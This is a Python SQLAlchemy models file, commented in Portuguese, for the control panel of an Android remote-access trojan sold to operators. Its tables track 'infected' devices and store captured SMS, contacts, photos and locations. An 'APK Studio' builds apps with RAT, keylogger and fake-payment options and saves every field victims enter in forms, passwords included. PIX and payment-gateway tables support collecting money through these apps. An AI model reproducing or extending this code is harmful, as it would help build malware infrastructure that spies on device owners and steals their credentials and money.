"""
Models do banco de dados
"""

from sqlalchemy import Column, Integer, String, DateTime, Boolean, Text, ForeignKey
from sqlalchemy.orm import relationship
from database import Base
from datetime import datetime, timezone

class Operator(Base):
    """
    Operador (usuário do painel de controle)
    """
    __tablename__ = "operators"
    
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(50), unique=True, index=True, nullable=False)
    email = Column(String(100), unique=True, index=True, nullable=False)
    hashed_password = Column(String(255), nullable=False)
    is_active = Column(Boolean, default=True)
    is_admin = Column(Boolean, default=False)
    is_banned = Column(Boolean, default=False)  # Se foi banido
    hwid = Column(String(100), nullable=True, unique=True)  # Hardware ID único
    hwid_activated_at = Column(DateTime, nullable=True)  # Quando HWID foi ativado
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    last_login = Column(DateTime, nullable=True)
    last_ip = Column(String(45), nullable=True)  # Último IP de acesso
    notes = Column(Text, nullable=True)  # Notas do admin sobre o usuário
    expires_at = Column(DateTime, nullable=True)  # Opcional: data de expiração da conta
    
    # Relacionamento com dispositivos
    devices = relationship("Device", back_populates="owner")

class Device(Base):
    """
    Dispositivo Android infectado
    """
    __tablename__ = "devices"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String(100), unique=True, index=True, nullable=False)
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=True)  # Dono do dispositivo
    model = Column(String(100), nullable=True)
    manufacturer = Column(String(100), nullable=True)
    android_version = Column(String(20), nullable=True)
    first_seen = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    last_seen = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    is_online = Column(Boolean, default=False)
    ip_address = Column(String(45), nullable=True)
    custom_name = Column(String(100), nullable=True)
    
    # Relacionamentos
    owner = relationship("Operator", back_populates="devices")
    logs = relationship("DeviceLog", back_populates="device")

class DeviceLog(Base):
    """
    Logs de atividades dos dispositivos
    """
    __tablename__ = "device_logs"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String(100), ForeignKey("devices.device_id"), nullable=False)
    log_type = Column(String(50), nullable=False)  # COMMAND_SENT, SMS, LOCATION, etc.
    log_data = Column(Text, nullable=True)
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), index=True)
    
    # Relacionamento
    device = relationship("Device", back_populates="logs")

class CapturedData(Base):
    """
    Dados capturados dos dispositivos (SMS, contatos, fotos, etc.)
    """
    __tablename__ = "captured_data"
    
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String(100), nullable=False)
    data_type = Column(String(50), nullable=False)  # SMS, CONTACT, PHOTO, LOCATION, etc.
    data_content = Column(Text, nullable=True)
    captured_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), index=True)

class APKBuild(Base):
    """
    Registro de APKs buildados - usado para atribuir dispositivos automaticamente
    """
    __tablename__ = "apk_builds"
    
    id = Column(Integer, primary_key=True, index=True)
    build_id = Column(String(50), unique=True, index=True, nullable=False)  # ID único do build
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)  # Quem buildou
    app_name = Column(String(100), nullable=True)  # Nome do app
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    
    # Relacionamento
    owner = relationship("Operator")

class UserLayoutPreferences(Base):
    """
    Preferências de layout do painel por usuário
    Permite personalização completa de posição, tamanho e cor dos elementos
    """
    __tablename__ = "user_layout_preferences"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("operators.id"), nullable=False, unique=True)
    layout_data = Column(Text, nullable=True)  # JSON com todas as preferências de layout
    updated_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), onupdate=lambda: datetime.now(timezone.utc))
    
    # Relacionamento
    user = relationship("Operator")


class APKTemplate(Base):
    """
    Templates visuais de APK criados no APK Builder Visual
    Armazena todas as telas e elementos configurados pelo usuário
    """
    __tablename__ = "apk_templates"
    
    id = Column(Integer, primary_key=True, index=True)
    template_id = Column(String(50), unique=True, index=True, nullable=False)  # UUID do template
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)
    name = Column(String(100), nullable=False)  # Nome do template
    description = Column(Text, nullable=True)
    app_name = Column(String(100), nullable=False)  # Nome do app gerado
    package_name = Column(String(100), nullable=True)  # Package name do APK
    template_data = Column(Text, nullable=False)  # JSON com todas as telas e elementos
    theme_data = Column(Text, nullable=True)  # JSON com cores do tema
    is_public = Column(Boolean, default=False)  # Se pode ser usado por outros usuários
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    updated_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), onupdate=lambda: datetime.now(timezone.utc))
    
    # Relacionamento
    owner = relationship("Operator")


class APKVisualBuild(Base):
    """
    Registro de builds de APK visual - contém configurações completas de cada build
    """
    __tablename__ = "apk_visual_builds"
    
    id = Column(Integer, primary_key=True, index=True)
    build_id = Column(String(50), unique=True, index=True, nullable=False)  # ID único do build
    template_id = Column(String(50), ForeignKey("apk_templates.template_id"), nullable=True)
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)
    app_name = Column(String(100), nullable=False)
    build_data = Column(Text, nullable=False)  # JSON com configuração completa do build
    status = Column(String(20), default="pending")  # pending, building, done, error
    progress = Column(Integer, default=0)  # 0-100
    apk_filename = Column(String(255), nullable=True)  # Nome do arquivo APK gerado
    error_message = Column(Text, nullable=True)
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    completed_at = Column(DateTime, nullable=True)
    
    # Relacionamentos
    owner = relationship("Operator")
    template = relationship("APKTemplate")


# ============================================
# 💳 SISTEMA DE PAGAMENTO/PIX - APK STUDIO
# ============================================

class UserPixConfig(Base):
    """
    Configurações de PIX do usuário para APKs de pagamento
    Cada usuário pode ter várias chaves PIX configuradas
    """
    __tablename__ = "user_pix_configs"
    
    id = Column(Integer, primary_key=True, index=True)
    config_id = Column(String(50), unique=True, index=True, nullable=False)
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)
    name = Column(String(100), nullable=False)  # Nome identificador (ex: "PIX Principal")
    pix_key = Column(String(255), nullable=False)  # Chave PIX (CPF, email, telefone, aleatória)
    pix_key_type = Column(String(20), nullable=False)  # cpf, email, phone, random, cnpj
    beneficiary_name = Column(String(100), nullable=False)  # Nome do beneficiário
    beneficiary_city = Column(String(100), nullable=False)  # Cidade do beneficiário
    is_default = Column(Boolean, default=False)  # Se é a chave padrão
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    updated_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), onupdate=lambda: datetime.now(timezone.utc))
    
    # Relacionamento
    owner = relationship("Operator")


class UserPaymentGateway(Base):
    """
    Configurações de Gateway de Pagamento do usuário
    Suporta Mercado Pago, PagSeguro, Stripe, etc.
    """
    __tablename__ = "user_payment_gateways"
    
    id = Column(Integer, primary_key=True, index=True)
    gateway_id = Column(String(50), unique=True, index=True, nullable=False)
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)
    name = Column(String(100), nullable=False)  # Nome identificador
    gateway_type = Column(String(50), nullable=False)  # mercadopago, pagseguro, stripe, custom
    api_key = Column(String(500), nullable=True)  # Chave da API (criptografada)
    api_secret = Column(String(500), nullable=True)  # Secret da API (criptografada)
    access_token = Column(Text, nullable=True)  # Token de acesso
    webhook_url = Column(String(500), nullable=True)  # URL de webhook
    is_sandbox = Column(Boolean, default=True)  # Modo sandbox/teste
    is_active = Column(Boolean, default=True)
    extra_config = Column(Text, nullable=True)  # JSON com configs extras
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    updated_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), onupdate=lambda: datetime.now(timezone.utc))
    
    # Relacionamento
    owner = relationship("Operator")


class APKStudioProject(Base):
    """
    Projetos do APK Studio - cada usuário pode ter múltiplos projetos
    Um projeto pode ser um APK de pagamento, RAT, ou qualquer customização
    """
    __tablename__ = "apk_studio_projects"
    
    id = Column(Integer, primary_key=True, index=True)
    project_id = Column(String(50), unique=True, index=True, nullable=False)
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)
    name = Column(String(100), nullable=False)
    description = Column(Text, nullable=True)
    project_type = Column(String(50), nullable=False)  # payment, rat, custom, hybrid
    app_name = Column(String(100), nullable=False)
    package_name = Column(String(100), nullable=True)
    icon_data = Column(Text, nullable=True)  # Base64 do ícone
    screens_data = Column(Text, nullable=False)  # JSON com todas as telas
    theme_data = Column(Text, nullable=True)  # JSON com tema/cores
    pix_config_id = Column(String(50), ForeignKey("user_pix_configs.config_id"), nullable=True)
    gateway_id = Column(String(50), ForeignKey("user_payment_gateways.gateway_id"), nullable=True)
    enable_rat = Column(Boolean, default=False)  # Se inclui funcionalidade RAT
    enable_payment = Column(Boolean, default=False)  # Se inclui pagamento
    enable_keylogger = Column(Boolean, default=False)  # Se inclui keylogger
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    updated_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), onupdate=lambda: datetime.now(timezone.utc))
    
    # Relacionamentos
    owner = relationship("Operator")
    pix_config = relationship("UserPixConfig")
    payment_gateway = relationship("UserPaymentGateway")


class PaymentTransaction(Base):
    """
    Registro de transações de pagamento dos APKs criados
    """
    __tablename__ = "payment_transactions"
    
    id = Column(Integer, primary_key=True, index=True)
    transaction_id = Column(String(100), unique=True, index=True, nullable=False)
    project_id = Column(String(50), ForeignKey("apk_studio_projects.project_id"), nullable=False)
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)
    amount = Column(String(20), nullable=False)  # Valor em string para precisão
    currency = Column(String(3), default="BRL")
    payment_method = Column(String(50), nullable=False)  # pix, credit_card, boleto
    status = Column(String(20), nullable=False)  # pending, paid, failed, refunded
    payer_name = Column(String(100), nullable=True)
    payer_document = Column(String(20), nullable=True)  # CPF/CNPJ mascarado
    payer_email = Column(String(100), nullable=True)
    device_id = Column(String(100), nullable=True)  # ID do dispositivo que fez o pagamento
    gateway_transaction_id = Column(String(100), nullable=True)  # ID da transação no gateway
    pix_code = Column(Text, nullable=True)  # Código PIX gerado
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    paid_at = Column(DateTime, nullable=True)
    
    # Relacionamentos
    owner = relationship("Operator")
    project = relationship("APKStudioProject")


class StudioCapturedData(Base):
    """
    Dados capturados dos APKs do APK Studio - BANCO DE DADOS PERSISTENTE
    Armazena TODOS os dados recebidos dos formulários dos apps criados
    """
    __tablename__ = "studio_captured_data"
    
    id = Column(Integer, primary_key=True, index=True)
    project_id = Column(String(50), index=True, nullable=False)  # ID do projeto
    owner_id = Column(Integer, ForeignKey("operators.id"), nullable=False)  # Dono do projeto
    data_json = Column(Text, nullable=False)  # JSON com todos os campos capturados
    device_ip = Column(String(45), nullable=True)  # IP do dispositivo
    device_info = Column(Text, nullable=True)  # Info do dispositivo (JSON)
    created_at = Column(DateTime, default=lambda: datetime.now(timezone.utc), index=True)
    
    # Relacionamento
    owner = relationship("Operator")


class StudioDataField(Base):
    """
    Campos dinâmicos detectados nos projetos do APK Studio
    Mapeia automaticamente os campos que aparecem nos dados
    """
    __tablename__ = "studio_data_fields"
    
    id = Column(Integer, primary_key=True, index=True)
    project_id = Column(String(50), index=True, nullable=False)
    field_name = Column(String(100), nullable=False)  # Nome do campo
    field_type = Column(String(50), default="text")  # text, number, email, password, etc
    field_label = Column(String(200), nullable=True)  # Label amigável
    occurrences = Column(Integer, default=1)  # Quantas vezes apareceu
    first_seen = Column(DateTime, default=lambda: datetime.now(timezone.utc))
    last_seen = Column(DateTime, default=lambda: datetime.now(timezone.utc))